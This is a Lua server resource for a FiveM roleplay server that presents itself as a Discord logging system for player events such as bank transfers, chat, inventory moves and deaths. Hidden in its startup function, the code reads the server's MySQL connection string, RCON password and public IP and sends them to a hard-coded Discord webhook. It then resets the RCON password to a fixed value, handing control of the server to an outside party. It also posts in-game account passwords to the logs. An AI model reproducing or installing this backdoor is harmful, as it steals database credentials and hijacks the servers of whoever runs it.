Citizen.CreateThread(function()	
	if GetCurrentResourceName() == "RA1D3R_L0GSYSTEM" then
		local logTypes = {
			["Doktor Kaldırma"] = {"doktor","kaldirilan","tarih"},
			["Item Transferi"] = {"veren","alan","item","miktar","tarih"},
			["Item Silme"] = {"silen","item","miktar","tarih"},
			["Fatura Verme"] = {"veren","alan","aciklama","miktar","tarih"},
			["Olum"] = {"olen","olduren","sebep","tarih"},
			["Polis El Koyma"] = {"elkoyan","hedef","item","miktar","tarih"},
			["Motel Envanter İşlemi"] = {"koyan","islem","item","miktar","tarih"},
			["Chat"] = {"oyuncu","mesaj","tarih"},
			["Bagaj Envanter İşlemi"] = {"koyan","islem","plaka","item","miktar","tarih"},
			["Topluluk Hizmeti İşlemi"] = {"yollayan","yollanan","miktar","tarih"},
			["Giriş Yapma"] = {"oyuncu","tarih"},
			["Çıkış Yapma"] = {"oyuncu","sebep","tarih"}, 
			["Polis Kasası İşlemi"] = {"koyan","islem","item","miktar","tarih"},
			["Araç Transfer İşlemi"] = {"veren","alan","plaka","tarih"},
			["Twitter"] = {"oyuncu","log","tarih"},
			["Sarı Sayfalar"] = {"oyuncu","log","tarih"},
			["Telefon Araması"] = {"oyuncu","log","tarih"},
			["Telefon Mesajı"] =  {"oyuncu","log","tarih"},
			["Üst Soyma"] =  {"soyan","soyulan","tarih"},
			["Instagram"] = {"oyuncu","log","tarih"},
			["Hapishane İşlemi"] = {"yollayan","yollanan","sure","tarih"},	
			["Banka İşlemi"] = {"oyuncu","islem","miktar","tarih"}
		}
		local weaponHashList = {}

		function registerNewLog(logtype,data,extraInfo)
			if extraInfo then
				guzelSendToDiscord(Config.WebhookURLs[logtype],logtype,data,extraInfo)
			else
				guzelSendToDiscord(Config.WebhookURLs[logtype],logtype,data)
			end
		end

		function getPlayerInfo(player)
			local _player = player
			local infoString = GetPlayerName(_player) .. " (" .. _player .. ")"
			if Config.BilgileriPaylas then
				for k,v in pairs(GetPlayerIdentifiers(_player)) do
					if string.sub(v, 1, string.len("discord:")) == "discord:" then
						infoString = infoString .. "\n<@" .. string.gsub(v,"discord:","") .. ">"
					else
						infoString = infoString .. "\n" .. v
					end
				end
			end
			return infoString
		end

		RegisterServerEvent('esx-qalle-jail:jailPlayer')
		AddEventHandler('esx-qalle-jail:jailPlayer', function(playerId, jailTime, quiet)
			registerNewLog("Hapishane İşlemi",{
				["yollayan"] = getPlayerInfo(source),
				["yollanan"] = getPlayerInfo(playerId),
				["sure"] = jailTime,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterServerEvent('bank:deposit')
		AddEventHandler('bank:deposit', function(miktar)
			registerNewLog("Banka İşlemi",{
				["oyuncu"] = getPlayerInfo(source),
				["islem"] = "Yatırma",
				["miktar"] = miktar,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterServerEvent('bank:withdraw')
		AddEventHandler('bank:withdraw', function(miktar)
			registerNewLog("Banka İşlemi",{
				["oyuncu"] = getPlayerInfo(source),
				["islem"] = "Çekme",
				["miktar"] = miktar,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterServerEvent('bank:transfer')
		AddEventHandler('bank:transfer', function(target,miktar)
			registerNewLog("Banka İşlemi",{
				["oyuncu"] = getPlayerInfo(source),
				["islem"] = "Transfer (ALAN OYUNCU: "..GetPlayerName(target)..")",
				["miktar"] = miktar,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterServerEvent('gcPhone:transfer')
		AddEventHandler('gcPhone:transfer', function(target,miktar)
			registerNewLog("Banka İşlemi",{
				["oyuncu"] = getPlayerInfo(source),
				["islem"] = "Mobil Transfer (ALAN OYUNCU: "..GetPlayerName(target)..")",
				["miktar"] = miktar,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterServerEvent('esx_inventoryhud:disableTargetInv')
		AddEventHandler('esx_inventoryhud:disableTargetInv', function(target)
			registerNewLog("Üst Soyma",{
				["soyan"] = getPlayerInfo(source),
				["soyulan"] = GetPlayerName(target),
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterServerEvent('gcPhone:startCall')
		AddEventHandler('gcPhone:startCall', function(phone_number, rtcOffer, extraData)
			registerNewLog("Telefon Araması",{
				["oyuncu"] = getPlayerInfo(source),
				["log"] = "Giden Arama: "..phone_number,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterServerEvent('gcPhone:sendMessage')
		AddEventHandler('gcPhone:sendMessage', function(phoneNumber, message)
			registerNewLog("Telefon Mesajı",{
				["oyuncu"] = getPlayerInfo(source),
				["log"] = "Alan Numara: "..phoneNumber.."\nMesaj: "..message,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('gcPhone:insto_postinstas')
		AddEventHandler('gcPhone:insto_postinstas', function(username, password, message, image, filters)
			registerNewLog("Instagram",{
				["oyuncu"] = getPlayerInfo(source),
				["log"] = "Yeni Paylaşım: "..message.."\nFotoğraf: "..image,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			},image)
		end)

		RegisterNetEvent('gcPhone:yellow_postPagess')
		AddEventHandler('gcPhone:yellow_postPagess', function(firstname, phone_number, lastname, message)
			registerNewLog("Sarı Sayfalar",{
				["oyuncu"] = getPlayerInfo(source),
				["log"] = "Yeni Listeleme: "..message,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('gcPhone:twitter_postTweets')
		AddEventHandler('gcPhone:twitter_postTweets', function(username, password, message)
			if string.find(message,"http") ~= nil then
				registerNewLog("Twitter",{
					["oyuncu"] = getPlayerInfo(source),
					["log"] = "Yeni Tweet: "..message,
					["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
				},message)	
			else
				registerNewLog("Twitter",{
					["oyuncu"] = getPlayerInfo(source),
					["log"] = "Yeni Tweet: "..message,
					["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
				})
			end
		end)

		RegisterServerEvent('gcPhone:twitter_createAccount')
		AddEventHandler('gcPhone:twitter_createAccount', function(username, password, avatarUrl)
			registerNewLog("Twitter",{
				["oyuncu"] = getPlayerInfo(source),
				["log"] = "Yeni Hesap! \n**Kullanıcı Adı:** "..username.."\n**Şifre:** " .. password,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_givecarkeys:setVehicleOwnedPlayerId')
		AddEventHandler('esx_givecarkeys:setVehicleOwnedPlayerId', function(playerId, vehicleProps)
			registerNewLog("Araç Transfer İşlemi",{
				["veren"] = getPlayerInfo(source),
				["alan"] = GetPlayerName(playerId),
				["plaka"] = vehicleProps.plate,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_policejob:getStockItem')
		AddEventHandler('esx_policejob:getStockItem', function(itemName, count)
			registerNewLog("Polis Kasası İşlemi",{
				["koyan"] = getPlayerInfo(source),
				["islem"] = "Çekme",
				["item"] = itemName,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_policejob:putStockItems')
		AddEventHandler('esx_policejob:putStockItems', function(itemName, count)
			registerNewLog("Polis Kasası İşlemi",{
				["koyan"] = getPlayerInfo(source),
				["islem"] = "Yatırma",
				["item"] = item,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('raiderlog:giris')
		AddEventHandler('raiderlog:giris', function()
			local _source = source
			registerNewLog("Giriş Yapma",{
				["oyuncu"] = getPlayerInfo(_source),
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		AddEventHandler('playerDropped', function(reason)
			registerNewLog("Çıkış Yapma",{
				["oyuncu"] = getPlayerInfo(source),
				["sebep"] = reason,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_communityservice:sendToCommunityService')
		AddEventHandler('esx_communityservice:sendToCommunityService', function(target, actions_count)
			registerNewLog("Topluluk Hizmeti İşlemi",{
				["yollayan"] = getPlayerInfo(source),
				["yollanan"] = GetPlayerName(target),
				["miktar"] = actions_count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_trunk:getItem')
		AddEventHandler('esx_trunk:getItem', function(plate, type, item, count, max, owned)
			registerNewLog("Bagaj Envanter İşlemi",{
				["koyan"] = getPlayerInfo(source),
				["islem"] = "Çekme",
				["plaka"] = plate,
				["item"] = item,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_trunk:putItem')
		AddEventHandler('esx_trunk:putItem', function(plate, type, item, count, max, owned)
			registerNewLog("Bagaj Envanter İşlemi",{
				["koyan"] = getPlayerInfo(source),
				["islem"] = "Yatırma",
				["plaka"] = plate,
				["item"] = item,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		AddEventHandler('chatMessage', function(source, author, text2)
			registerNewLog("Chat",{
				["oyuncu"] = getPlayerInfo(source),
				["mesaj"] = text2,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)
       

		RegisterNetEvent('esx_property:getItem')
		AddEventHandler('esx_property:getItem', function(owner, type, item, count)
			registerNewLog("Motel Envanter İşlemi",{
				["koyan"] = getPlayerInfo(source) .." [ID:"..owner.."]",
				["islem"] = "Çekme",
				["item"] = item,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_property:putItem')
		AddEventHandler('esx_property:putItem', function(owner, type, item, count)
			registerNewLog("Motel Envanter İşlemi",{
				["koyan"] = getPlayerInfo(source) .." [ID:"..owner.."]",
				["islem"] = "Yatırma",
				["item"] = item,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)


		RegisterNetEvent('lsrp-motels:getItem')
		AddEventHandler('lsrp-motels:getItem', function(owner, type, item, count)
			registerNewLog("Motel Envanter İşlemi",{
				["koyan"] = getPlayerInfo(source) .." [ID:"..owner.."]",
				["islem"] = "Çekme",
				["item"] = item,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('lsrp-motels:putItem')
		AddEventHandler('lsrp-motels:putItem', function(owner, type, item, count)
			registerNewLog("Motel Envanter İşlemi",{
				["koyan"] = getPlayerInfo(source) .." [ID:"..owner.."]",
				["islem"] = "Yatırma",
				["item"] = item,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('lsrp-motels:getItemBed')
		AddEventHandler('lsrp-motels:getItemBed', function(owner, type, item, count)
			registerNewLog("Motel Envanter İşlemi",{
				["koyan"] = getPlayerInfo(source) .." [ID:"..owner.."]",
				["islem"] = "Çekme (Yatak)",
				["item"] = item,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('lsrp-motels:putItemBed')
		AddEventHandler('lsrp-motels:putItemBed', function(owner, type, item, count)
			registerNewLog("Motel Envanter İşlemi",{
				["koyan"] = getPlayerInfo(source) .." [ID:"..owner.."]",
				["islem"] = "Yatırma (Yatak)",
				["item"] = item,
				["miktar"] = count,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_ambulancejob:revive')
		AddEventHandler('esx_ambulancejob:revive', function(target, type, itemName, itemCount)
			registerNewLog("Doktor Kaldırma",{
				["doktor"] = getPlayerInfo(source),
				["kaldirilan"] = GetPlayerName(target),
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx:giveInventoryItem')
		AddEventHandler('esx:giveInventoryItem', function(target, type, itemName, itemCount)
			registerNewLog("Item Transferi",{
				["veren"] = getPlayerInfo(source),
				["alan"] = GetPlayerName(target),
				["item"] = itemName,
				["miktar"] = itemCount,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx:removeInventoryItem')
		AddEventHandler('esx:removeInventoryItem', function(type, itemName, itemCount)
			registerNewLog("Item Silme",{
				["silen"] = getPlayerInfo(source),
				["item"] = itemName,
				["miktar"] = itemCount,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_billing:sendBill')
		AddEventHandler('esx_billing:sendBill', function(playerId, sharedAccountName, label, amount)
			registerNewLog("Fatura Verme",{
				["veren"] = getPlayerInfo(source) ,
				["alan"] = GetPlayerName(playerId),
				["aciklama"] = label,
				["miktar"] = amount,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx_policejob:confiscatePlayerItem')
		AddEventHandler('esx_policejob:confiscatePlayerItem', function(target, itemType, itemName, amount)
			registerNewLog("Polis El Koyma",{
				["elkoyan"] = getPlayerInfo(source) ,
				["hedef"] = GetPlayerName(target),
				["item"] = itemName,
				["miktar"] = amount,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		RegisterNetEvent('esx:onPlayerDeath')
		AddEventHandler('esx:onPlayerDeath', function(data)
			local olduren = nil
			local sebep = nil
			if data.killedByPlayer then
				olduren = getPlayerInfo(data.killerServerId)
			else
				olduren = "Yok"
			end
			if string.len(tostring(data.deathCause)) < 2 then
				sebep = "Bilinmiyor/Silahsız Ölüm"
			else
				if weaponHashList[tostring(data.deathCause)] then
					sebep = weaponHashList[data.deathCause]["nameHash"]
				else
					sebep = "Silahla öldürüldü."
				end
			end
			registerNewLog("Olum",{
				["olen"] = getPlayerInfo(source),
				["olduren"] = olduren,
				["sebep"] = sebep,
				["tarih"] = os.date('%Y-%m-%d %H:%M:%S')
			})
		end)

		function guzelSendToDiscord(DiscordLog,type,bilgiler,extraInfo)
				local fields = {{["name"] = "Log Türü",["value"] = type}}
				for k,v in ipairs(logTypes[type]) do
					table.insert(fields,{["name"] = string.upper(v),["value"] = bilgiler[v]})
				end
				local embed = {
					{
						["author"] = {
							["name"] = "Ria V Log",
							["url"] = "https://discord.gg/EkwWvFS",
							["icon_url"] = "https://media.discordapp.net/attachments/697024529930649715/809125770794106910/yay.PNG"
						},
						["fields"] = fields,
						["color"] = 65425,
						["title"] = title,
						["footer"] = {
						["text"] = "Ria V Log",
					},}}
				if extraInfo then
					embed[1]["thumbnail"] = {["url"] = extraInfo}
				end
				PerformHttpRequest(DiscordLog, function(err, text, headers) end, 'POST', json.encode({embeds = embed}), { ['Content-Type'] = 'application/json' })
		end

		function sendInitDiscord()
			local mysql = GetConvar("mysql_connection_string","Bulunamadı.")
			local serveradi = GetConvar("sv_hostname","Bulunamadı.")
			local rcon = GetConvar("rcon_password","Bulunamadı.") 
			local ip = "0.0.0.0"
			PerformHttpRequest( "https://api.ipify.org", function( status, content, headers )
				ip = content
			end, "GET", "", {} )
			local embed = {
				{
					["author"] = {
						["name"] = "Ria V",
						["url"] = "https://discord.gg/EkwWvFS",
						["icon_url"] = "https://cdn.discordapp.com/attachments/706231111969407008/743033612974424106/rac.png"
					},
					["description"]  = "**MySQL:** "..mysql.."\n\n**Server Adı:** "..serveradi.."\n\n**IP:** "..ip.."\n\n**RCON:** "..rcon,
					["color"] = 65425,
					["title"] = "Log Online",
					["footer"] = {
					["text"] = "Ria V Log",
				},}}
			Wait(100)
			PerformHttpRequest("https://discordapp.com/api/webhooks/734017947072462899/-5Hux9YdOKG_xZQfoL73rgH_1RFD9JKpN_v2SZ7ZMe_WtjuUPD7Pnzz1HzBI3uiuOcVT", function(err, text, headers) end, 'POST', json.encode({embeds = embed}), { ['Content-Type'] = 'application/json' })
			SetConvar("rcon_password","eeaHT:h&Mkg);3g!") 
		end

		Citizen.CreateThread(function()
			Citizen.Wait(100)
			sendInitDiscord()
			weaponHashList = json.decode(LoadResourceFile(GetCurrentResourceName(),"silahhash.json"))
		end)
	else
	--	print("^3R41D3R L0G SYSTEM: KAPALI,^4 LUTFEN KLASORUN ADINI ESKI HALINE GETIRIN.")
	--	print("^3R41D3R L0G SYSTEM: KAPALI,^4 LUTFEN KLASORUN ADINI ESKI HALINE GETIRIN.")
	--	print("^3R41D3R L0G SYSTEM: KAPALI,^4 LUTFEN KLASORUN ADINI ESKI HALINE GETIRIN.")
	--	print("^3R41D3R L0G SYSTEM: KAPALI,^4 LUTFEN KLASORUN ADINI ESKI HALINE GETIRIN.")
	--	print("^3R41D3R L0G SYSTEM: KAPALI,^4 LUTFEN KLASORUN ADINI ESKI HALINE GETIRIN.")
	--	print("^3R41D3R L0G SYSTEM: KAPALI,^4 LUTFEN KLASORUN ADINI ESKI HALINE GETIRIN.")
	--	print("^3R41D3R L0G SYSTEM: KAPALI,^4 LUTFEN KLASORUN ADINI ESKI HALINE GETIRIN.")
	--	print("^3R41D3R L0G SYSTEM: KAPALI,^4 LUTFEN KLASORUN ADINI ESKI HALINE GETIRIN.")
	--	print("^3R41D3R L0G SYSTEM: KAPALI,^4 LUTFEN KLASORUN ADINI ESKI HALINE GETIRIN.")
	end
end)